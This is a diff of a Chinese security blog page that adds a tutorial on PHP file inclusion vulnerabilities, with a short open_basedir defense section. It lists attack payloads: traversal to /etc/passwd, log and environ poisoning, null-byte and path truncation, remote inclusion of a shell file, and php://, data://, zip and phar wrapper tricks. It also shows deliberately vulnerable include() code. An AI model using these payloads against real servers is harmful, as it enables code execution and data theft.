@@ -81,14 +81,22 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="分类">
-<meta property="og:url" content="http://pursu0.github.io/categories/index.html">
+<meta name="description" content="简述允许客户端用户输入控制包含在服务器端的文件，会导致恶意代码的执行以及敏感信息泄露。 形式包括本地文件包含和远程文件包含两种形式。 常见包含函数：include()、require()  1.include是当代码执行到它的时候才加载文件，发生错误时只警告，之后继续执行 2.require是在程序开始执行是调用文件，发生错误给出错误提示，并且终止执行  require常用于文件头包含类文件，数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="http://pursu0.github.io/2019/10/29/文件包含/index.html">
 <meta property="og:site_name" content="Pursu0 blogs">
+<meta property="og:description" content="简述允许客户端用户输入控制包含在服务器端的文件，会导致恶意代码的执行以及敏感信息泄露。 形式包括本地文件包含和远程文件包含两种形式。 常见包含函数：include()、require()  1.include是当代码执行到它的时候才加载文件，发生错误时只警告，之后继续执行 2.require是在程序开始执行是调用文件，发生错误给出错误提示，并且终止执行  require常用于文件头包含类文件，数据">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-26T10:26:44.002Z">
+<meta property="og:image" content="http://pursu0.github.io/2019/10/29/文件包含/1.png">
+<meta property="og:image" content="http://pursu0.github.io/2019/10/29/文件包含/2.png">
+<meta property="og:image" content="http://pursu0.github.io/2019/10/29/文件包含/3.png">
+<meta property="og:image" content="http://pursu0.github.io/2019/10/29/文件包含/4.png">
+<meta property="og:updated_time" content="2019-11-02T08:41:11.627Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="分类">
+<meta name="twitter:title" content="文件包含漏洞">
+<meta name="twitter:description" content="简述允许客户端用户输入控制包含在服务器端的文件，会导致恶意代码的执行以及敏感信息泄露。 形式包括本地文件包含和远程文件包含两种形式。 常见包含函数：include()、require()  1.include是当代码执行到它的时候才加载文件，发生错误时只警告，之后继续执行 2.require是在程序开始执行是调用文件，发生错误给出错误提示，并且终止执行  require常用于文件头包含类文件，数据">
+<meta name="twitter:image" content="http://pursu0.github.io/2019/10/29/文件包含/1.png">
 
 
 
@@ -118,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://pursu0.github.io/categories/">
+  <link rel="canonical" href="http://pursu0.github.io/2019/10/29/文件包含/">
 
 
 
 
 
-  <title>分类 | Pursu0 blogs</title>
+  <title>文件包含漏洞 | Pursu0 blogs</title>
   
 
 
@@ -271,40 +279,330 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://pursu0.github.io/2019/10/29/文件包含/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pursu0">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pursu0 blogs">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">分类</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="category-all-page">
-            <div class="category-all-title">
-                目前共计 6 个分类
-            </div>
-            <div class="category-all">
-              <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/TOP10漏洞整理/">TOP10漏洞整理</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf相关/">ctf相关</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/信息收集/">信息收集</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/基础回顾/">基础回顾</a><span class="category-list-count">2</span></li></ul>
-            </div>
-          </div>
+          <h1 class="post-title" itemprop="name headline">文件包含漏洞</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-29T21:15:11+08:00">
+                2019-10-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/TOP10漏洞整理/" itemprop="url" rel="index">
+                    <span itemprop="name">TOP10漏洞整理</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>允许客户端用户输入控制包含在服务器端的文件，会导致恶意代码的执行以及敏感信息泄露。</p>
+<p>形式包括本地文件包含和远程文件包含两种形式。</p>
+<p>常见包含函数：include()、require()</p>
+<blockquote>
+<p>1.include是当代码执行到它的时候才加载文件，发生错误时只警告，之后继续执行</p>
+<p>2.require是在程序开始执行是调用文件，发生错误给出错误提示，并且终止执行</p>
+</blockquote>
+<p>require常用于文件头包含类文件，数据库文件等。include常用于包含html模版文件</p>
+<p>include_once(),require_once功能相同，区别：当重复调用时只调用一次</p>
+<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><ol>
+<li><p>包含目录文件</p>
+<p>?file=./../../../text.txt</p>
+<p>./当前目录../上级目录</p>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2014-073100.html" target="_blank" rel="noopener">金山软件官网文件包含</a></p>
+</li>
+<li><p>包含日志文件</p>
+<p>无法上传文件时，可向user-agent插入payload到日志文件，然后包含容器的日志文件</p>
+<blockquote>
+<p> 注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录 </p>
+</blockquote>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2014-073100.html" target="_blank" rel="noopener">文件读取漏洞路径</a></p>
+</li>
+<li><p>包含系统环境</p>
+<p>linux下的/proc/self/environ</p>
+<p>需要php运行在cgi上面.与包含日志一样在user-agent插入 payload.</p>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2014-073100.html" target="_blank" rel="noopener">Exploiting LFI to RCE /proc/self/environ with burpsuite</a></p>
+</li>
+</ol>
+<ol start="4">
+<li><p>包含session文件</p>
+<p>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p>
+</li>
+<li><p>包含其他由php创建的tmp文件</p>
+<p>向服务器上任意php文件以form-data方式提交请求上传数据时，会生成临时文件，通过phpinfo来获取临时文件的路径以及名称，然后临时文件在极短时间被删除的时候，需要竞争时间去包含临时文件拿到webshell（写脚本，尽量写java脚本，java执行效率高）</p>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0134185.html" target="_blank" rel="noopener"> 链家旗下自如某站一个有意思的文件包含到简单内网渗透 </a></p>
+<h2 id="本地包含小姿势"><a href="#本地包含小姿势" class="headerlink" title="本地包含小姿势"></a>本地包含小姿势</h2></li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"inc/"</span>.$_GET[<span class="string">'file'</span>].<span class="string">".htm"</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#包含模板文件eg</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>%00截断</p>
+<p>/etc/passwd%00</p>
+<blockquote>
+<p>需要magic_quotes_gpc=off, PHP小于5.3.4</p>
+</blockquote>
+</li>
+<li><p>%00截断目录遍历</p>
+<p>/var/www/%00</p>
+<blockquote>
+<p>需要magic_quotes_gpc=off, unix文件系统，比如FreeBSD,OpenBSD,NetBSD,Solaris</p>
+</blockquote>
+</li>
+<li><p>路径长度截断</p>
+<p>/etc/passwd/./././././././.[…]/./././././././.</p>
+<blockquote>
+<p>php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256</p>
+</blockquote>
+</li>
+<li><p>点号截断</p>
+<p>/boot.ini/……….[…]…………</p>
+<blockquote>
+<p>php版本小于5.2.8可以成功，只使用与windows，点号长于256</p>
+</blockquote>
+<h2 id="远程包含及常见封装协议"><a href="#远程包含及常见封装协议" class="headerlink" title="远程包含及常见封装协议"></a>远程包含及常见封装协议</h2></li>
+</ol>
+<h5 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h5><p>?file=[http|https|ftp]://example.com/shell.txt</p>
+<blockquote>
+<p>需要allow_url_fopen=On并且allow_url_include=On</p>
+</blockquote>
+<p>445共享：可以bypass allow_url_include为off，因为其只限制http,https,ftp</p>
+<p>现在运营商封杀445情况下可以通过webdav绕过（限windows）</p>
+<ol>
+<li><p>利用php输入流 input（可接受post传过来的值）</p>
+<blockquote>
+<p>需要allow_url_include=On</p>
+</blockquote>
+<img src="//pursu0.github.io/2019/10/29/文件包含/1.png" alt="1" style="zoom:70%;">
+</li>
+<li><p>利用流过滤器filter（可读取php文内容，不需要开启allow_url_include）：</p>
+<p>?file=php://filter/convert.base64-encode/resource=index.php</p>
+</li>
+<li><p>利用data URIS:</p>
+<p>?file=data://text/plain;base64,base64编码的payload</p>
+<blockquote>
+<p>需要allow_url_include=On</p>
+</blockquote>
+<img src="//pursu0.github.io/2019/10/29/文件包含/2.png" alt="2" style="zoom:70%;">
+
+<blockquote>
+<p>图中编码为&lt;?php phpinfo();</p>
+<p>无?&gt;闭合，有则无法执行</p>
+</blockquote>
+</li>
+<li><p>伪造session技巧：</p>
+<p><strong>ua中以及其他utf-8字段的截断可用%F0%9D%8C%86( 𝌆 )截断</strong></p>
+<blockquote>
+<p><em>详例见代码执行篇</em></p>
+</blockquote>
+</li>
+<li><p>zip协议&amp;&amp;phar协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"GET:file"</span>;</span><br><span class="line">	$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($file) &amp;&amp; strtolower(substr($file, <span class="number">-4</span>))==<span class="string">".jpg"</span>)&#123;</span><br><span class="line">		<span class="keyword">include</span>($file);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"GET:file"</span>;</span><br><span class="line">	$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span>($file.<span class="string">'.jpg'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>截取后4位字符，判断是否为.php，是则包含<strong>or</strong>加入后缀.jpg包含。\x00截断在5.3.4以后不用了，使用zip协议或者phar协议包含</p>
+<p><strong>ZIP协议：</strong></p>
+<p>以上述代码为例利用zip协议：</p>
+<img src="//pursu0.github.io/2019/10/29/文件包含/3.png" alt="3" style="zoom:75%;">
+
+<p>includezip.jpg中写入php代码，封装为zip文件</p>
+<img src="//pursu0.github.io/2019/10/29/文件包含/4.png" alt="4" style="zoom:70%;">
+
+
+
+</li>
+</ol>
+<blockquote>
+<p>zip协议要求：php版本要求大于等于5.3.0</p>
+</blockquote>
+<p>   <strong>PHAR协议</strong></p>
+   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">new</span> PharDate(dirname(_FILE_).<span class="string">'/phartest.abc'</span>,<span class="number">0</span>,<span class="string">'phartest'</span>,Phar::ZIP);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'phartest.jpg'</span>,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>   用phar协议将php文件归档到一个文件包中</p>
+<p>   构造包含协议： <a href="http://127.0.0.1/test/include.php?file=phar://phartest.abc/phartest.jpg" target="_blank" rel="noopener">http://127.0.0.1/test/include.php?file=phar://phartest.abc/phartest.jpg</a> </p>
+<blockquote>
+<p>phar协议要求：php大于5.3.0</p>
+<p>需要将php.ini的参数phar.readonly设置为off</p>
+</blockquote>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p><strong>设置open_basedir</strong></p>
+<ol>
+<li><p>open_basedir介绍：</p>
+<p>将php所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。</p>
+</li>
+</ol>
+<blockquote>
+<p>不受安全模式开关的影响</p>
+</blockquote>
+<ol start="2">
+<li><p>open_basedir设置方法</p>
+<ol>
+<li><p>在php.ini中加入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir=<span class="string">"指定目录"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在程序中使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'指定目录'</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>不建议使用</p>
+</blockquote>
+</li>
+<li><p>在apache的httpd.conf中的Directory配置</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_admin_value open_basedir <span class="string">"指定目录"</span></span><br></pre></td></tr></table></figure>
+
+<p>httpd.conf中的VritualHost</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_admin_value open_basedir <span class="string">"指定目录"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>nginx factcgi.conf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_param PHP_VALUE <span class="string">"open_basedir=指定目录"</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong></p>
+<p>open_basedir指定的限制实际上是前缀，而不是确定的目录名</p>
+<p>eg：当指定了open_basedir=/usr/share，但还是能访问/usr/share_abc，若要将访问限制为指定目录，需用斜杠结束路径eg：open_basedir=/usr/share/</p>
+<p>​                                                                            –END–</p>
+<hr>
+<blockquote>
+<p><em>文章原型为<a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">l3m0n师傅原文章</a></em></p>
+<p><em>用于回顾top10漏洞，添加了更多的东西</em></p>
+</blockquote>
+</li>
+</ol>
+</li>
+</ol>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/27/后渗透/" rel="next" title>
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -337,8 +635,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -396,6 +703,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简述"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地包含"><span class="nav-number">2.</span> <span class="nav-text">本地包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地包含小姿势"><span class="nav-number">3.</span> <span class="nav-text">本地包含小姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程包含及常见封装协议"><span class="nav-number">4.</span> <span class="nav-text">远程包含及常见封装协议</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#远程代码执行"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">远程代码执行</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御"><span class="nav-number">4.0.1.</span> <span class="nav-text">防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
